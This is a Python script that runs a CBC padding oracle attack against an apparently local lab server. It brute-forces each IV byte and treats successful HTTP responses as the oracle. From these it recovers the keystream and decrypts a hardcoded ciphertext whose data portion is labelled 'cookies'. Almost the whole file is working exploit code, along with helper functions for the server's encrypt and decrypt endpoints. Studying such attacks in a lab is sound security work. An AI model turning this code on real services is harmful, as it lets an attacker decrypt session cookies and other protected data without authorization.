#!/usr/bin/env python3
from binascii import hexlify, unhexlify
from time import sleep
import requests
import logging


# Constants
BLOCK_SIZE = 16
MAX_BYTE_VALUE = 255
URL = "http://127.0.0.1:5000/process"
ENCRYPT_HEADER = {'Is-Encrypted': 'false'}
DECRYPT_HEADER = {'Is-Encrypted': 'true'}

logging.basicConfig(level=logging.INFO)


def encrypt_data(plaintext):
    """
    Encrypts the provided plaintext using a server endpoint.
    :param plaintext: (str): The input data to be encrypted.
    :return: str or None: The encrypted data obtained from the server response or None in case of an error.
    """
    try:
        response = requests.post(URL, data=plaintext, headers=ENCRYPT_HEADER)
        response.raise_for_status()
        data = response.json()
        return data.get('encrypted_data', '')

    except requests.exceptions.RequestException as e:
        logging.error(f"Error during encryption: {e}")
        return None


def decrypt_data(ciphertext):
    """
    Decrypts the provided ciphertext using a server endpoint.
    :param ciphertext: (str): The input data to be decrypted.
    :return: str or None: The decrypted data obtained from the server response or None in case of an error.
    """
    try:
        response = requests.post(URL, data=ciphertext, headers=DECRYPT_HEADER)
        response.raise_for_status()
        data = response.json()
        return data.get('decrypted_data', '')

    except requests.exceptions.RequestException as e:
        logging.error(f"Error during decryption: {e}")
        return None


def compute_keystream_byte(iv_byte, pad):
    """
    Computes the keystream byte by XORing the IV byte and the padding value.
    :param iv_byte: (int): The byte value from the IV.
    :param pad: (int): The padding value.
    :return: int: The computed keystream byte obtained by XORing iv_byte and pad.
    """
    return iv_byte ^ pad


def compute_plaintext_byte(original_iv, keystream):
    """
    Computes the plaintext byte by XORing the original IV byte with the keystream byte
    :param original_iv: (int): The byte value from the original Initialization Vector (IV).
    :param keystream: (int): The computed keystream byte.
    :return: int: The computed plaintext byte obtained by XORing the original_iv and keystream.
    """
    plaintext_byte = original_iv ^ keystream
    return plaintext_byte


def compute_next_valid_iv_byte(keystream, padding, modified_iv):
    """
    Computes the next valid Initialization Vector (IV) byte for a padding oracle attack.

    :param keystream: (list): List of computed keystream bytes.
    :param padding: (int): The padding value.
    :param modified_iv: (bytearray): The current state of the modified IV.
    :return: bytearray: The modified IV with the next valid byte computed based on the padding and keystream.
    """
    for i in range(len(keystream)):
        next_iv = keystream[i] ^ padding
        modified_iv[len(modified_iv)-1-i] = next_iv
    return modified_iv


def oracle_padding(ciphertext):
    """
    Performs a padding oracle attack to decrypt the provided ciphertext.
    :param ciphertext: (str): The ciphertext to be decrypted.
    :return: None
    """
    keystream = []
    plaintext = []

    original_ct = bytearray(unhexlify(ciphertext))
    original_iv = original_ct[:BLOCK_SIZE]
    cookies = original_ct[BLOCK_SIZE:]

    modified_iv = bytearray(b'0000000000000000')
    padding = 0x01
    ks_index = 0
    for iv_index in reversed(range(BLOCK_SIZE)):

        for byte_value in range(MAX_BYTE_VALUE+1):  # one byte FF = 255 + 1 = 256
            modified_iv[iv_index] = byte_value
            modified_ct = hexlify(modified_iv + cookies)
            response = requests.post(URL, data=modified_ct, headers=DECRYPT_HEADER)

            if response.status_code == 200:
                data = response.json()
                decrypted_text = data.get('decrypted_data', '')

                logging.info(f"Valid iv byte: {hex(byte_value)}")
                keystream.append(compute_keystream_byte(iv_byte=byte_value, pad=padding))
                logging.info(f"Keystream bytes: {[hex(byte) for byte in keystream]}")

                plaintext.append(compute_plaintext_byte(keystream[ks_index], original_iv[iv_index]))
                logging.info(f"Plaintext bytes: {[hex(byte) for byte in plaintext]}")

                logging.info(f"Decrypted Text: {decrypted_text}")
                break

        padding += 1
        modified_iv = compute_next_valid_iv_byte(keystream, padding, modified_iv)
        ks_index += 1
    plaintext_chars = ''.join(chr(byte) for byte in reversed(plaintext))
    logging.info(f"Complete Decrypted Text: {plaintext_chars}")
    sleep(1)


if __name__ == '__main__':
    encrypted_data = b'31323334353637383930313233343536f044039223b4b9aea7bc48cd1be80682'
    oracle_padding(ciphertext=encrypted_data)

    # # Test encryption
    # plaintext = b'Hello, Friend!'
    # encrypted_data = encrypt_data(plaintext)
    # print(f"Encrypted Text: {encrypted_data}")
    #
    # # Test decryption
    # decrypted_result = decrypt_data(encrypted_data)
    # print(f"Decrypted Text: {decrypted_result}")